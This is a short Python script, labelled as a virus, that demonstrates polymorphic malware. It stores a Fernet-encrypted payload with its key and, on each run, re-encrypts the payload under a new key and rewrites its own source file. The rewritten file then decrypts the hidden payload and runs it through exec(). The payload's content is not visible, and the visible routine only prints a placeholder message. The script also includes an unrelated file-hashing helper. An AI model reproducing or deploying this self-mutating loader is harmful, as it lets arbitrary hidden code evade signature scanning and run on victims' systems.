import inspect
import os
from cryptography.fernet import Fernet
import hashlib


# ---------------------------------------------------------------------------
# Getting file Hash Unrelated to the virus code
def hash_file(filename):
   h = hashlib.sha1()
   with open(filename,'rb') as file:
       chunk = 0
       while chunk != b'':
           chunk = file.read(1024)
           h.update(chunk)

   return h.hexdigest()

message = hash_file(os.path.basename(__file__))
print("Hash of the file is: ", message)
# End of Hash Code
# ---------------------------------------------------------------------------


def decrypt(token, key):
    fer = Fernet(key)
    virus = fer.decrypt(token).decode()
    exec(virus)


# START
key = "dsTkswm0UnI9gt4KTTI3zmYGg0KCrCWy-8lvbrdkQek="
token = "gAAAAABjGsQSDqMMcSA0ZY-h-5XaQsQ-9HWkxAVP570OX7b_ezXPUWHUkINwK568EKgbHe1nwabqnqjEoDdQLIPH5yczsX-HiIUT7IlObekyr7Q0qii1xrYO7wNKh_OjyBh7mLiR-VFVae6x-IVKJBHu-oQOLs2Hwg4b0FvFL2ttg8IjRHQcIOYtZYnrQK1cBW36JaH5JZgkmQd6-ujG7FDISo4DzrFPTeA6kmBOhzGo2o9DOa05w2dfz_pcWPVBrQEBk_LdgDdGfQevp8CsHEJueFrEDiDaAhT79-zKTADGJ4JmVwYClEQB8nE8izbhu_kftFuQG2E2P3TtFIAqA2sNEQeIiuMdXVPiqR6LSEhnDNlwa0dthXyogoLoEBatpEgDx8u2PjW3DsLK8rdW5zW9ZEnX_P6DmjUl41iZoXAvVYgnTRe7XnJavTpC6jZoQQ28hWOcYpeFYqeG_3gikGu25F1aY340QIoSBUXpr7ifbIUzshscBG4cpdKY5vc2oGOe_WhTW7tGJpQwmu1DM3IXMc4i6G8fhSDMfW9wsTq3WheKQp_0zc-x2QR0sbm8tZ-UDM9e9nYGtebTFXakDo0ZL7VVfGPa28CfNwCGZnaZMQriAXIhmh8OomU1LMfhcLZ1Lo1WuFtumMGE82wGBz1dvbX1J2nJh_MsC8-q1eoEz4TAZPSaehlkwMOExTuwyTPN_CliEFQtfTz5bUwjCcC6RTTKVhw1pfQuK7wbxiVEOQ9c7dK0p_MNcy4wx7KACTT87UG4uMl04BoYPdbVH0ZYHVukm0oD0X6DtK4VjWYBMG5xHGiimqQIRGuMcoBoeiHqi4Uf3owdJTjhMdyeWAK4rngTbTsiseZ10vZGDTXEYG-RHJhH4ehQ2dAdleXNhuLSL1icA0oWj4ofMPnpIiyZb0vDRLiceVTdyRQkB10AGlTT15GXGzsMTz17lVrmkdUe7bknlFjI-J73ml5YyiTGlSFJa3L3yj3nr1qby--TknWZiDCgzf45gifcJaRcELP8UsjPIBvlaIDNje3haO81DMyemRjlT7aR1nRO_a9blOHv5wqHOG6doMXiM2Q1hMr80JZymnsY6bvtqL2JlBI3yFUMo8XZvJIMlt_H1yHjgUA6l1PRyqwsZQrfuBYrQRQv9fnsbH578DdjbWJGaQXXPJWIYNWCRsbQ4Nlmr1k1Vy4jXR4kTkdIm5bo-ACgVBYK1tlwIaRu"

def run():
    def execute(virus):
        print("Executing virus: {}".format(virus))
    
    execute("Hello World")

    fname = os.path.basename(__file__)
    lines = []
    with open(fname, 'r') as f:
        lines = f.readlines()
    
    with open('lol', 'w') as f:
        for line in lines:
            if line.startswith("# START"):
                break
            f.write(line)

        f.write("# START\n")
        global key
        global token

        fer = Fernet(key)
        virus = fer.decrypt(token).decode()

        key = Fernet.generate_key()
        fer = Fernet(key)
        token = fer.encrypt(virus.encode())
    
        f.write("key = \"{}\"\n".format(key.decode()))
        f.write("token = \"{}\"\n".format(token.decode()))
        f.write("\ndecrypt(token, key)\n")
    
    os.remove(fname)
    os.rename("lol", fname)


run()